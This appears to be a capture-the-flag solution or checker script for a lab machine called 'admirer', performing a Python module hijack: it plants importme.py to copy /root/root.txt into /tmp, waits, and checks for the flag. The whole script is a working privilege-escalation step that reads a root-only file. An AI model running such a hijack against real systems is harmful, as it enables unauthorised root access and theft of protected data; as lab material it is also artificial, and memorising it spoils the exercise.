set -eu
cat > /opt/admirer/importme.py <<'EOF'
open('/tmp/admirer-root', 'w').write(open('/root/root.txt').read())
EOF
for _ in 1 2 3 4 5 6 7 8 9 10; do
    [ -s /tmp/admirer-root ] && break
    sleep 1
done
out=$(cat /tmp/admirer-root 2>/dev/null || true)
echo "$out"
echo "$out" | grep -q 'FLAG{root-' || { echo "PYTHONPATH hijack failed" >&2; exit 1; }
